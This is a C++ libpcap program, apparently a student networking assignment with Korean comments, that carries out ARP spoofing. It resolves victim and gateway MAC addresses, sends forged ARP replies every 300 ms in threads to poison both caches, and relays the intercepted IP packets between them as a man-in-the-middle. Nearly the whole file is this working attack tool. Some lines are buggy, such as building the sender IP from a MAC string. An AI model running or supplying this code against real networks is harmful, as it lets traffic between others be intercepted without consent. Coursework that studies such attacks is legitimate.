#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"

#include <iostream>
#include <fstream>
#include <string>
#include <cstring>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

#include <thread>
#include <vector>

#pragma pack(push, 1)
struct EthArpPacket final {
   EthHdr eth_;
   ArpHdr arp_;
};
#pragma pack(pop)

// mac주소의 경우 /sys/class/net/ + "dev" + /address 에 위치해 있다는 것을 알 수 있었다. 
// 해당 정보를 가지고 다음과 같이 프로그램을 작성 할 수 있었다. 

void usage() {
   printf("syntax: send-arp-test <interface>\n");
   printf("sample: send-arp-test wlan0\n");
}

bool get_mac(const char* dev, char* mac) {
    std::string mac_addr;
    std::ifstream mac_get("/sys/class/net/" + std::string(dev) + "/address");

    if (mac_get) {
        std::getline(mac_get, mac_addr);
        mac_get.close();
        if (!mac_addr.empty()) {
            strcpy(mac, mac_addr.c_str());
            return true;
        }
    }
    return false;
}

// https://stackoverflow.com/questions/17909401/linux-c-get-default-interfaces-ip-address
bool get_ip(const char* dev, char* ip) {
    struct ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);

    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    ioctl(s, SIOCGIFADDR, &ifr);
    close(s);

    std::string str(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

    if (!str.empty()) {
        strcpy(ip, str.c_str());
        return true;
    }
    return false;
}

bool find_mac(pcap_t *handle, char *s_mac, char *sender_ip, std::string *v_mac){
   //지난시간의 send_arp 코드이다.  
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); //soon fix it
	packet.eth_.smac_ = Mac(s_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(s_mac);
	packet.arp_.sip_ = htonl(Ip(s_mac));
	packet.arp_.tmac_ = Mac("ff:ff:ff:ff:ff:ff"); //soon fix it
	packet.arp_.tip_ = htonl(Ip(sender_ip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

   while(true){

		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) {
			printf("<PCAP ERROR CODE %d>\n", res);
			break;
		}

		EthArpPacket* eth_arp_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet));

		if(eth_arp_packet->eth_.type_ != htons(EthHdr::Arp) || eth_arp_packet->arp_.op_ != htons(ArpHdr::Reply) || eth_arp_packet->arp_.op_ != htons(ArpHdr::Reply)){
			continue;
		}
		else{
			*v_mac = std::string(eth_arp_packet->arp_.smac_);
			break;
		}
   }

   if(v_mac == NULL){
      printf("Get ARP table failed\n");
      return false;
   }

   return true;
}

void infect_arp(char *dev, char *sender_ip, char *target_ip, std::string sender_mac, char *s_mac){
   //주어진 코드 재사용, 쓰레드 사용으로 인한 handle 재정의
   char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return;
	}

	while(true){
		EthArpPacket packet;

      //기존의 코드에서의 변형, 변형 부분의 경우 표기.
		packet.eth_.dmac_ = Mac(sender_mac); //해당 부분의 경우 처음 브로드캐스트의 경우 FF:FF:FF:FF 이지만 sender로 변경
	   packet.eth_.smac_ = Mac(s_mac);
	   packet.eth_.type_ = htons(EthHdr::Arp);

	   packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	   packet.arp_.pro_ = htons(EthHdr::Ip4);
	   packet.arp_.hln_ = Mac::SIZE;
	   packet.arp_.pln_ = Ip::SIZE;
	   packet.arp_.op_ = htons(ArpHdr::Reply); //이 부분의 경우 Reply로 답을 보내야 하기에 변경
	   packet.arp_.smac_ = Mac(s_mac);
	   packet.arp_.sip_ = htonl(Ip(target_ip)); // 해당 부분 및 tip의 경우 맞게 수정.
	   packet.arp_.tmac_ = Mac(sender_mac);
	   packet.arp_.tip_ = htonl(Ip(sender_ip));

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		
      //위의 코드 사용
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

      //while문의 사용으로 터지지 않게 sleep함수 사용
		else{
			std::this_thread::sleep_for(std::chrono::milliseconds(300));
		}

	}//End of "while"

	pcap_close(handle);
}

void ARP_Spoofing(char *dev, char *sender_ip, char *target_ip, std::string sender_mac, std::string target_mac, char *s_mac){
   //쓰레드 사용으로 인한 handle 재정의
   char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return;
	}

   while(true){
      struct pcap_pkthdr* header;
      const u_char* packet;
      int res = pcap_next_ex(handle, &header, &packet);
      if (res == 0) continue;
      if (res == -1 || res == -2) {
         printf("<PCAP ERROR CODE %d>\n", res);
         break;
      }
   

   EthHdr *eth = (EthHdr*) packet;

      //잡아온 패킷이 IP인지 확인 하는 절차이다. 
      if(eth->type() == EthHdr::Ip4){
         IpHdr *ip = (IpHdr*)(packet + sizeof(EthHdr));
         std::string source_ip = std::string(ip->sip());
         if(source_ip.compare(sender_ip) == 0){
            printf("Receive Sender Ip\n");

            eth->dmac_ = Mac(target_mac);
            eth->smac_ = Mac(s_mac);
            res = pcap_sendpacket(handle, packet, header->caplen);
               
            if (res != 0) {
               fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
            else{
               printf("RELAY_Sender\n");
            }
         }
         else if(source_ip.compare(target_ip) == 0){
            //Third, check whether the IP is from target.
				printf("Receive Target IP\n");

				eth->dmac_ = Mac(sender_mac);
		      eth->smac_ = Mac(s_mac);
				res = pcap_sendpacket(handle, packet, header->caplen);
				
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}
				else{
					printf("RELAY_Target\n");
			    }

         }
      }
      else continue;
   }
   pcap_close(handle);
}



int main(int argc, char* argv[]) {
   //인자의 경우 총 3개여서 argc의 최소값의 경우 4이기에 이 부분 제외 및 쌍 맞지 않는것 제외
   if (argc < 3 || argc % 2 != 0) {
      usage();
      return -1;
   }

   char* dev = argv[1];
   char errbuf[PCAP_ERRBUF_SIZE];
   pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
   if (handle == nullptr) {
      fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
      return -1;
   }

   /////////////////
   // MY IP & MAC //
   /////////////////

   // char sender_ip[Ip::SIZE];
   // std::string sender_ip_string;

   // if(get_ip(dev, sender_ip) == false){
   //    printf("FAIL GET IP\n");
   //    return 2;   
   // }
   // else{
   //    printf("IP : %s\n",sender_ip);
   //    sender_ip_string = std::string(sender_ip);
   // }

   char s_mac[Mac::SIZE];

   if(get_mac(dev,s_mac) == false){
      printf("FAIL GET MAC\n");
      return 2;
   }
   else{
      printf("MAC : %s\n",s_mac);
   }

   std::vector<std::thread> THREAD;
   ////////////////////////////////////////////////////////////

	for(int i = 2; i < argc; i+=2){
      char *ip_sender = argv[i]; //victim's ip
      char *ip_target = argv[i+1]; //gateway's ip
		std::string sender_mac;
      std::string target_mac;

      find_mac(handle,s_mac,ip_sender,&sender_mac);
      find_mac(handle, s_mac, ip_target, &target_mac);

      THREAD.push_back(std::thread(infect_arp, dev, ip_sender, ip_target, sender_mac, s_mac));
      THREAD.push_back(std::thread(infect_arp, dev, ip_target, ip_sender, target_mac, s_mac));
      THREAD.push_back(std::thread(ARP_Spoofing,dev,ip_sender,ip_target, sender_mac,target_mac,s_mac));

   }
   pcap_close(handle);

   for(auto& t : THREAD){
		t.join();
	}

   return 0;
}